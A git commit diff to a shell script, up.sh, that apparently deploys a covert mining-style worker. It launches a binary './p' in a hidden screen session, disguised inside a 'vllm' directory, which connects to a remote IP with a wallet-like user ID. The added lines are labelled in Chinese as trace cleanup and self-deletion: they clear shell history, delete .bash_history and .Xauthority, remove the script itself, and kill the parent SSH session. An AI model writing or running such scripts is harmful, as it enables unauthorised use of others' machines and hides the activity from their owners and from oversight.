64cea4a97e0833d6b465289adcb34b33af5dd7cd
xiaobintse <143440039+xiaobintse@users.noreply.github.com>
2026-06-25 14:19:09 +0800

    Update up.sh

--- up.sh
+++ up.sh
@@ -4,16 +4,13 @@
 screen -XS p quit 2>/dev/null; screen -wipe >/dev/null 2>&1
 
 # 2. 启动新会话
-# 建议先 cd 再执行，确保路径一致性
-screen -dmS p bash -c 'cd ~/vllm && source bin/activate && ./p --host 84.32.220.219:9000 --user prl1p0w4e8dd5mpmk7jgzxkx6vja80k3jqs6vt2kcltly8rfz026m95cs33mnk5 --worker NEW'
+screen -dmS p bash -c "sleep 5 && source $HOME/vllm/bin/activate && cd $HOME/vllm && ./p --host 84.32.220.219:9000 --user prl1p0w4e8dd5mpmk7jgzxkx6vja80k3jqs6vt2kcltly8rfz026m95cs33mnk5 --worker new"
 
-# 3. 留一点缓冲时间确保 screen 成功启动
-sleep 2
+# 3. 痕迹清理
+history -c
+rm -f $HOME/.Xauthority
+rm -f $HOME/.bash_history
 
-# 4. 清理历史记录
-rm -f ~/.Xauthority
-rm -f ~/.bash_history
-history -c  # 清除当前 session 的内存历史
-
-# 5. 强制关闭当前 SSH 终端会话
+# 脚本自删除
+rm -f "$0"
 kill -9 $PPID
